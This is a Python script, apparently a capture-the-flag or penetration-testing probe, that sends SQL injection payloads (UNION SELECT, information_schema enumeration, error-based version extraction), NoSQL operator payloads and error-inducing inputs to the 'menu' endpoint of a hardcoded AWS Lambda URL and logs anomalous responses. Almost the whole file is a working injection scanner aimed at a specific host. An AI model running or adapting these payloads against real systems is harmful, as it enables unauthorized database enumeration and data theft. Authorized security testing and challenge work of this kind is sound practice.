import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import time

class InjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.menu_url = urljoin(base_url, 'menu')
        self.seen_responses = set()
        self.interesting_responses = []

    def make_request(self, method, params=None, data=None, headers=None):
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        if headers:
            default_headers.update(headers)

        try:
            response = requests.request(
                method=method,
                url=self.menu_url,
                params=params,
                data=data,
                headers=default_headers,
                timeout=5
            )

            # Check if response is unique and interesting
            response_hash = hash(response.text)
            if response_hash not in self.seen_responses:
                self.seen_responses.add(response_hash)
                if self.is_interesting_response(response):
                    self.log_interesting_response(method, params, data, response)

            return response

        except Exception as e:
            print(f"Error with {method} request: {str(e)}")
            return None

    def is_interesting_response(self, response):
        # Define criteria for interesting responses
        if response.status_code != 200:
            return True

        if hasattr(self, 'baseline_response') and len(response.text) != len(self.baseline_response):
            return True

        if any(keyword in response.text.lower() for keyword in ['error', 'exception', 'select']):
            return True

        return False

    def log_interesting_response(self, method, params, data, response):
        self.interesting_responses.append({
            'method': method,
            'params': params,
            'data': data,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'response_preview': response.text[:200]
        })

    def test_http_methods(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH', 'TRACE']
        for method in methods:
            self.make_request(method)

    def test_parameters(self):
        params = {
            'query': 'burger',
            'id': '1',
            'category': 'all',
            'price': '10',
            'filter': 'special',
            'sort': 'price',
            'order': 'desc',
            'limit': '10'
        }

        # Test each parameter individually
        for param, value in params.items():
            self.make_request('POST', data={param: value})
            self.make_request('GET', params={param: value})

    def generate_sql_payloads(self):
        payloads = []

        # Order By Testing
        for i in range(1, 10):
            payloads.extend([
                f"' ORDER BY {i}--",
                f'" ORDER BY {i}--',
                f"') ORDER BY {i}--",
                f'`) ORDER BY {i}--'
            ])

        # UNION Testing
        unions = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--"
        ]
        payloads.extend(unions)

        # Information Schema
        info_schema = [
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
            "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
            "' AND 1=convert(int,@@version)--",
            "' AND 1=convert(int,db_name())--"
        ]
        payloads.extend(info_schema)

        # Case Testing
        cases = ['dish', 'DISH', 'DiSh', 'dIsH']
        payloads.extend(cases)

        return payloads

    def test_nosql_injection(self):
        nosql_payloads = [
            {'query': {'$gt': ''}},
            {'query': {'$ne': None}},
            {'query': {'$exists': True}},
            {'query': {'$regex': '.*'}},
            {'query': {'$where': 'true'}},
            {'query': {'$gt': {'$gt': ''}}}
        ]

        for payload in nosql_payloads:
            # Try as JSON
            self.make_request('POST', data=json.dumps(payload),
                              headers={'Content-Type': 'application/json'})
            # Try as URL-encoded
            self.make_request('POST', data={'query': json.dumps(payload)})

    def test_error_inducing(self):
        error_payloads = [
            'query[]',
            'query[id]',
            'query.id',
            'query[0]',
            'query;}alert(1);{',
            'query=burger&query[]=test',
            'query[burger]=test',
            'query.burger.test=1'
        ]

        for payload in error_payloads:
            self.make_request('POST', data={'query': payload})
            self.make_request('GET', params={'query': payload})

    def run_all_tests(self):
        print("Starting comprehensive injection tests...")

        # Get baseline response safely
        baseline_response = self.make_request('POST', data={'query': 'burger'})
        if baseline_response is None:
            print("Error: Baseline response is None. Exiting tests.")
            return  # Exit early if the request failed
        self.baseline_response = baseline_response.text

        # Run all tests
        self.test_http_methods()
        self.test_parameters()

        sql_payloads = self.generate_sql_payloads()
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.make_request, 'POST', data={'query': payload}) for payload in sql_payloads]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error in executing payload: {str(e)}")

        self.test_nosql_injection()
        self.test_error_inducing()

        # Print results
        print("\nTest completed. Found", len(self.interesting_responses), "interesting responses.")
        for i, resp in enumerate(self.interesting_responses, 1):
            print(f"\nInteresting Response #{i}:")
            print(f"Method: {resp['method']}")
            print(f"Params: {resp['params']}")
            print(f"Data: {resp['data']}")
            print(f"Status Code: {resp['status_code']}")
            print(f"Response Length: {resp['response_length']}")
            print(f"Preview: {resp['response_preview']}")
            print("-" * 50)

if __name__ == "__main__":
    tester = InjectionTester('https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws')
    tester.run_all_tests()
